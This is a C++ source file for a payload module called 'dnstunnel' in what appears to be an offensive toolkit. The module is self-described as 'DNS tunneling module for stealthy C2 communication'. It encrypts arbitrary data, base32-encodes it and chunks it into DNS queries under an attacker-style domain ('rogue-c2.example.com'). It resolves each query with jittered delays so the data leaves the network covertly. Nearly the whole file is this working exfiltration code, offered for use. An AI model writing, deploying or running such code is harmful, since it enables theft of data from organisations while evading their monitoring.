#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include <openssl/evp.h>

#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <thread>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

Bytes aes_gcm_seal(const Bytes& key, const Bytes& nonce, const Bytes& plain) {
    Bytes out;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (ctx == nullptr) return out;
    do {
        if (key.size() != 32) break;
        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) break;
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, (int)nonce.size(), nullptr) != 1) break;
        if (EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce.data()) != 1) break;
        out.resize(plain.size() + 16);
        int len = 0;
        if (!plain.empty() &&
            EVP_EncryptUpdate(ctx, out.data(), &len, plain.data(), (int)plain.size()) != 1) {
            out.clear();
            break;
        }
        int total = len;
        int fin = 0;
        if (EVP_EncryptFinal_ex(ctx, out.data() + total, &fin) != 1) {
            out.clear();
            break;
        }
        total += fin;
        unsigned char tag[16];
        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
            out.clear();
            break;
        }
        out.resize((size_t)total);
        out.insert(out.end(), tag, tag + 16);
    } while (false);
    EVP_CIPHER_CTX_free(ctx);
    return out;
}

std::string base32_std_encode(const Bytes& data) {
    static const char* alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    std::string out;
    int buffer = 0, bits = 0;
    for (uint8_t b : data) {
        buffer = (buffer << 8) | b;
        bits += 8;
        while (bits >= 5) {
            out.push_back(alphabet[(buffer >> (bits - 5)) & 31]);
            bits -= 5;
        }
    }
    if (bits > 0) out.push_back(alphabet[(buffer << (5 - bits)) & 31]);
    while (out.size() % 8 != 0) out.push_back('=');
    while (!out.empty() && out.back() == '=') out.pop_back();
    return out;
}

std::string hex32(uint32_t v) {
    char buf[16];
    std::snprintf(buf, sizeof(buf), "%04x", v);
    return buf;
}

std::string hex2(unsigned v) {
    char buf[8];
    std::snprintf(buf, sizeof(buf), "%02x", v);
    return buf;
}

void lookup_host(const std::string& name) {
    struct addrinfo hints;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(name.c_str(), nullptr, &hints, &res) == 0 && res != nullptr) freeaddrinfo(res);
}

std::string go_time_string() {
    std::time_t t = std::time(nullptr);
    std::tm tmv{};
    gmtime_r(&t, &tmv);
    char buf[64];
    std::strftime(buf, sizeof(buf), "%Y-%m-%d %H:%M:%S", &tmv);
    char ns[16];
    std::snprintf(ns, sizeof(ns), ".%09d", 0);
    return std::string(buf) + ns + " +0000 UTC m=+0.000000001";
}

class DNSTunnel : public Payload {
  public:
    const char* name() const override { return "dnstunnel"; }
    const char* category() const override { return "exfiltration"; }
    const char* description() const override {
        return "DNS tunneling module for stealthy C2 communication";
    }

    Output execute(const Args& args) const override {
        auto get = [&](const char* k, const char* def) -> std::string {
            auto it = args.find(k);
            return (it == args.end() || it->second.empty()) ? std::string(def) : it->second;
        };
        std::string domain = get("domain", "rogue-c2.example.com");
        std::string data = get("data", "test payload for DNS exfiltration");
        std::string mode = get("mode", "client");

        std::string seed = "RogueDNSTunnel2024";
        Bytes key = sha256(Bytes(seed.begin(), seed.end()));

        OJ r = OJ::object();
        r["timestamp"] = now_rfc3339();
        r["domain"] = domain;
        r["mode"] = mode;
        r["data_size"] = (int)data.size();

        if (mode == "client") {
            std::string tstr = go_time_string();
            Bytes th = sha256(Bytes(tstr.begin(), tstr.end()));
            std::string sid = to_hex(th).substr(0, 8);
            r["session_id"] = sid;

            Bytes nonce(12, 0);
            Bytes encrypted = aes_gcm_seal(key, nonce, Bytes(data.begin(), data.end()));
            std::string encoded = base32_std_encode(encrypted);

            OJ queries = OJ::array();
            int chunks = 0;
            for (size_t i = 0; i < encoded.size(); i += 50) {
                std::string chunk = encoded.substr(i, std::min<size_t>(50, encoded.size() - i));
                std::string query = "v" + hex32((uint32_t)(i / 50)) + "." + chunk + ".data." + sid +
                                    "." + domain;
                if (query.size() > 253) {
                    for (size_t j = 0; j < chunk.size(); j += 40) {
                        std::string sub = chunk.substr(j, std::min<size_t>(40, chunk.size() - j));
                        std::string subq = "v" + hex32((uint32_t)(i / 50)) + "s" +
                                           hex2((unsigned)(j / 40)) + "." + sub + ".data." + sid +
                                           "." + domain;
                        if (subq.size() <= 253) {
                            lookup_host(subq);
                            queries.push_back(subq);
                        }
                    }
                } else {
                    lookup_host(query);
                    queries.push_back(query);
                }
                chunks++;
                std::this_thread::sleep_for(std::chrono::milliseconds(500 + (std::rand() % 1000)));
            }
            r["chunks"] = chunks;
            r["queries"] = queries;
            r["success"] = true;
        } else {
            r["chunks"] = 0;
            r["session_id"] = "";
            r["success"] = true;
        }

        std::string s = MarshalJSON(r);
        return Output(s.begin(), s.end());
    }
};

DNSTunnel g_dnstunnel;

struct Reg { Reg() { Register(&g_dnstunnel); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
